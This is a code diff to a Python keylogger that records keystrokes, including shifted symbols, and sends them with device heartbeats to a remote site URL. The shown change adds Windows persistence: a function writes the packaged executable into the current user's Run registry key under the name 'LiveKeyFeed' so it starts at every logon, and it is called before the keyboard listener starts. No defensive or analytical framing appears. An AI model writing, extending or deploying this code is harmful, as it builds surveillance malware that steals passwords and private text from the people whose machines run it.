@@ -4,6 +4,7 @@ import json
 import hashlib
 import platform
 import socket
+import sys
 import ctypes
 from ctypes import wintypes
 from queue import Queue
@@ -31,6 +32,7 @@ active_modifiers = set()
 state_lock = Lock()
 message_queue = Queue()
 client_started_at = int(time.time() * 1000)
+STARTUP_ENTRY_NAME = "LiveKeyFeed"
 
 SHIFTED_SYMBOLS = {
     "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
@@ -193,6 +195,31 @@ def send_heartbeat():
         print(f"Could not send device heartbeat: {error}")
 
 
+def register_startup_launch():
+    if os.name != "nt" or not getattr(sys, "frozen", False):
+        return
+
+    try:
+        import winreg
+
+        startup_command = f'"{sys.executable}"'
+        with winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_SET_VALUE,
+        ) as startup_key:
+            winreg.SetValueEx(
+                startup_key,
+                STARTUP_ENTRY_NAME,
+                0,
+                winreg.REG_SZ,
+                startup_command,
+            )
+    except OSError as error:
+        print(f"Could not register automatic startup: {error}")
+
+
 def heartbeat_sender():
     while True:
         send_heartbeat()
@@ -288,6 +315,7 @@ def on_release(key):
 
 
 print(f"Sending to {SITE_URL}")
+register_startup_launch()
 Thread(target=message_sender, daemon=True).start()
 Thread(target=heartbeat_sender, daemon=True).start()
 with Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
